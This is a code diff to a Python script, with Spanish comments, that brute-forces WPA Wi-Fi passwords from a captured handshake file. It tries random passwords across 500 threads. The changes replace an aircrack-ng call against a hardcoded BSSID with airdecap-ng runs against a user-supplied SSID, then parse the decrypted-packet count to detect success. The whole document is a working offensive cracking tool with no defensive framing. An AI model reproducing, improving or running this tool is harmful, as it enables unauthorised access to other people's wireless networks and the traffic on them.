@@ -1,11 +1,12 @@
 #!/bin/python3
-
+import os
 
 # Funciona
 try:
     import subprocess
     import random
     import string
+    import re
     import threading
     import concurrent.futures
     import time
@@ -14,6 +15,7 @@ try:
     from colorama import Fore
     from concurrent.futures import ThreadPoolExecutor
     from tqdm import tqdm
+    #from evilHunter import exiting
     colorama.init()
 except ModuleNotFoundError as e:
     print("[!] Faltan Modulos...\n", e)
@@ -21,7 +23,6 @@ except ModuleNotFoundError as e:
 tries = 0
 tried = []
 password_found = threading.Event()
-ex = threading.Event()
 
 # Generar una contraseña aleatoria
 
@@ -36,7 +37,6 @@ def generate_password(length):
     password = ''.join(random.choice(characters) for _ in range(length))
 
     while password in tried:
-        print("a")
         password = ''.join(random.choice(characters) for _ in range(length))
 
     tried.append(password)
@@ -44,37 +44,41 @@ def generate_password(length):
     return password, tries
 
 
-def brute_force(progress_bar, file, long):
+def brute_force(progress_bar, file, long, network_to_attack):
+    global found
     found = False
 # not found and
     # Intentar descifrar el handshake con diferentes contraseñas generadas
-    while not password_found.is_set():
+    while not password_found.is_set() and not found:
 
         password, num = generate_password(long)
+
         progress_bar.set_description(Fore.LIGHTYELLOW_EX + r"[♦] Attempt: " + Fore.LIGHTCYAN_EX + f"{num}" +
                                      Fore.LIGHTYELLOW_EX + " Password: " + Fore.LIGHTCYAN_EX + f"{password}"
                                      + Fore.RESET)
 
-        # Ejecutar aircrack-ng con la contraseña generada
-        command = f"aircrack-ng -w - -b E4:AB:89:1F:57:4E {file}"
-        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE, encoding="utf-8")
-        output = process.communicate(password)[0]
+        command = subprocess.Popen(
+            ["airdecap-ng", "-p", password, "-e", network_to_attack, file],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = command.communicate()[0]
 
-        # Verificar si se encontró la contraseña
-        if "KEY FOUND" in output:
-            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + f"Contraseña encontrada: {password}\n")
+        dec_pkts = re.search(r"Number of decrypted WPA  packets\s+(\d+)", output.decode())
+        dec_pkts = int(dec_pkts.group(1))
+
+        if dec_pkts > 0:
+            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + "Contraseña encontrada: " + Fore.LIGHTYELLOW_EX + f"{password}\n")
+            print(Fore.GREEN + "\n\n\t[+] " + Fore.BLUE + "Decrypted packets: " + Fore.LIGHTYELLOW_EX + f"{dec_pkts}\n")
             found = True
             password_found.set()
 
 
-def startbrute(file, length, threads):
+def startbrute(file, length, threads, network_to_attack):
     start_time = datetime.now()
-    main(file, length, threads)
+    main(file, length, threads, network_to_attack)
     print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start_time)
 
 
-def main(file, long, threads):
+def main(file, long, threads, network_to_attack):
 
     try:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Starting brute force...\n" + Fore.RESET)
@@ -83,22 +87,26 @@ def main(file, long, threads):
         time.sleep(0.5)
         print(Fore.YELLOW + "\n[*] " + Fore.GREEN + "DONE! Starting...\n" + Fore.RESET)
         time.sleep(0.5)
-        stop = threading.Event()
+        threads = int(threads)
+
         with ThreadPoolExecutor(max_workers=threads) as executor:
             # Lista de tareas
             futures = []
             progress_bar = tqdm(total=0)
 
             for i in range(threads):
-                future = executor.submit(brute_force, progress_bar, file, long)
+                future = executor.submit(brute_force, progress_bar, file, long, network_to_attack)
                 future.deamon = True
                 futures.append(future)
+
+        concurrent.futures.wait(futures)
 
     except KeyboardInterrupt:
         print(Fore.RED + "\n\n\n\n[*] Recived -> CTRL + C" + Fore.LIGHTYELLOW_EX + "\n\n\tStopping threads, wait in "
                                                                                    "process...\n\n")
         progress_bar.close()
         password_found.set()
+        found = "Fake"
 
         # Cancelamos todos los hilos/tareas
         for future in futures:
@@ -107,10 +115,10 @@ def main(file, long, threads):
         # Esperamos a todos los hilos detenidos
         concurrent.futures.wait(futures)
 
-        exit(0)
 
 
 if __name__ == "__main__":
     start = datetime.now()
-    main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500)
+    print()
+    main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500, network_to_attack=input("SSID Name -> "))
     print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start)
